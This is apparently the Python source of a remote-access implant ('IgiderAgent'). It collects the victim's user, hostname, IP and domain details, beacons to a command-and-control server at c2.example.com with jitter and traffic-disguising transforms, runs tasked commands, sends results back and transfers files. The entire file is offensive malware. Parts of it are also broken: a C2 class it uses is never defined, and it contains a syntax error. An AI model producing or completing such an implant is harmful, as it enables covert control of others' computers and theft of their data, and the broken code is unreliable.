import os
from dotenv import load_dotenv
import platform
import socket
import time
import logging
import json
from uuid import uuid4
import psutil
import requests
from typing import Dict, List, Optional

load_dotenv()  # Looks in current directory by default

# ============== LOGGING CONFIG ==============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("IgiderAgent")

# ============== IMPLANT INFORMATION ==============
class Agent:
    def __init__(self):
        self.id = str(uuid4())
        self.user = os.getlogin()
        self.host = socket.gethostname()
        self.pid = os.getpid()
        self.os_version = platform.platform()
        self.architecture = platform.machine()
        self.ip = self._get_ip_addresses()
        self.domain = self._get_domain_info()

    def _get_ip_addresses(self) -> List[str]:
        """Get all IPv4 addresses except localhost"""
        return [
            addr.address for interface in psutil.net_if_addrs().values()
            for addr in interface if addr.family == socket.AF_INET 
            and addr.address != '127.0.0.1'
        ]

    def _get_domain_info(self) -> str:
        """Cross-platform domain detection"""
        try:
            if platform.system() == 'Windows':
                return os.environ.get('USERDOMAIN', '')
            return socket.getfqdn().split('.', 1)[1] if '.' in socket.getfqdn() else ''
        except Exception:
            return ""

igid = Agent()

# ============== BASE C2 CLASS ==============
class BaseC2:
    def __init__(self, config: Dict):
        self.base_url = config['c2_url'].rstrip('/')
        self.interval = config['interval']
        self.jitter = config.get('jitter', 0.2)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': f'Igider/{igid.architecture}',
            'X-Implant-ID': igid.id
        })

    def checkin(self) -> bool:
        """Register agent with C2 server"""
        payload = {
            "id": igid.id,
            "ips": igid.ip,
            "hostname": igid.host,
            "os": igid.os_version,
            "arch": igid.architecture,
            "domain": igid.domain,
            "pid": igid.pid,
            "user": igid.user
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/checkin",
                json=payload,
                timeout=15
            )
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Checkin failed: {str(e)}")
            return False

    def get_tasking(self) -> List[Dict]:
        """Fetch queued tasks from C2"""
        try:
            response = self.session.get(
                f"{self.base_url}/tasks/{igid.id}",
                timeout=10
            )
            return response.json().get('tasks', [])
        except Exception as e:
            logger.error(f"Task fetch failed: {str(e)}")
            return []

    def post_response(self, task_id: str, output: Dict) -> bool:
        """Submit task results"""
        try:
            response = self.session.post(
                f"{self.base_url}/responses/{task_id}",
                json=output,
                timeout=15
            )
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Response submission failed: {str(e)}")
            return False

    def gen_sleep_time(self) -> float:
        """Generate jittered sleep interval"""
        return self.interval * (1 + (self.jitter * (2 * (time.time() % 1) - 1)))

# ============== COMMAND HANDLER ==============
class CommandHandler:
    def __init__(self):
        self.commands: Dict[str, callable] = {}

    def register_command(self, name: str, func: callable):
        self.commands[name] = func

    def execute(self, task: Dict) -> Dict:
        try:
            command = task.get('command')
            if not command:
                return error_response("No command specified")
                
            if command not in self.commands:
                return error_response(f"Unknown command: {command}")
                
            return self.commands[command](task)
            
        except Exception as e:
            return error_response(f"Command execution failed: {str(e)}")

# Initialize handler and register commands
handler = CommandHandler()

# ============== MAIN LOOP ==============
def main_loop():
    # Load Dynamic C2 Configuration
    config = {
        # Base configuration
        'interval': int(os.getenv('C2_INTERVAL', 60)),
        'jitter': float(os.getenv('C2_JITTER', 0.2)),
        'chunk_size': int(os.getenv('C2_CHUNK_SIZE', 512000)),
        'aes_psk': os.getenv('C2_AES_PSK', ''),
        'key_exchange': os.getenv('C2_KEY_EXCHANGE', 'false').lower() == 'true',
        
        # Dynamic endpoint configuration (could load from JSON file)
        'get_endpoints': [
            {
                'method': 'GET',
                'urls': json.loads(os.getenv('C2_GET_URLS', '["http://c2.example.com"]')),
                'uri': os.getenv('C2_GET_URI', '/api/v1/tasks'),
                'query_params': [
                    {
                        'name': 'id',
                        'value': 'message',
                        'transforms': [
                            {'function': 'base64'},
                            {'function': 'random_mixed', 'parameters': [8]}
                        ]
                    }
                ],
                'headers': [
                    {
                        'name': 'User-Agent',
                        'value': os.getenv('C2_USER_AGENT', 'Mozilla/5.0'),
                        'transforms': []
                    }
                ]
            }
        ],
        'post_endpoints': [
            {
                'method': 'POST',
                'urls': json.loads(os.getenv('C2_POST_URLS', '["http://c2.example.com"]')),
                'uri': os.getenv('C2_POST_URI', '/api/v1/responses'),
                'body_transforms': [
                    {'function': 'base64'},
                    {'function': 'random_alpha', 'parameters': [5]}
                ]
            }
        ],
        
        # Proxy configuration
        'proxy_host': os.getenv('C2_PROXY_HOST', ''),
        'proxy_port': os.getenv('C2_PROXY_PORT', ''),
        'proxy_user': os.getenv('C2_PROXY_USER', ''),
        'proxy_pass': os.getenv('C2_PROXY_PASS', ''),
        
        # Kill date
        'killdate': os.getenv('C2_KILLDATE', '')
    }
    
    # Initialize dynamic C2 connection
    c2 = DynamicHTTPC2(config)
    
    # Perform initial checkin with transformed endpoints
    agent_info = {
        "ip": igid.ip[0] if igid.ip else '127.0.0.1',
        "pid": igid.pid,
        "user": igid.user,
        "host": igid.host,
        "os": igid.os_version,
        "arch": igid.architecture,
        "domain": igid.domain
    }
    
    if not c2.checkin(agent_info):
        logger.critical("Initial checkin failed. Exiting.")
        return

    logger.info(f"Agent {igid.id} active. Dynamic C2 configured with {len(config['get_endpoints']} GET and {len(config['post_endpoints'])} POST endpoints")
    
    while True:
        try:
            # Get tasks through dynamic endpoint rotation
            tasks = c2.get_tasking()
            
            for task in tasks:
                try:
                    # Execute task and get result
                    result = handler.execute(task)
                    
                    # Send response through randomized POST endpoints
                    if not c2.post_response(task['id'], result):
                        logger.warning(f"Failed to submit response for task {task['id']}")
                        
                    # Handle dynamic file transfers
                    if 'file_action' in result:
                        file_info = json.loads(result['user_output'])
                        if file_info['action'] == 'download':
                            c2.download_file(task['id'], file_info['path'])
                        elif file_info['action'] == 'upload':
                            c2.upload_file(task['id'], file_info['file_id'])
                        
                except Exception as task_error:
                    logger.error(f"Task {task.get('id')} failed: {str(task_error)}")
                    c2.post_response(task['id'], error_response(f"Task execution error: {str(task_error)}"))
            
            # Sleep with dynamic jitter
            time.sleep(c2.gen_sleep_time())
            
        except KeyboardInterrupt:
            logger.info("Exiting via user interrupt")
            break
            
        except Exception as loop_error:
            logger.error(f"Main loop error: {str(loop_error)}")
            time.sleep(60)  # Prevent tight loop on critical failure

def error_response(message: str) -> Dict:
    return {
        "status": "error",
        "user_output": message,
        "completed": True
    }

if __name__ == "__main__":
    # Import command modules to register handlers
    try:
        from agent_functions import *
    except ImportError as e:
        logger.critical(f"Failed to load commands: {str(e)}")
        exit(1)
        
    main_loop()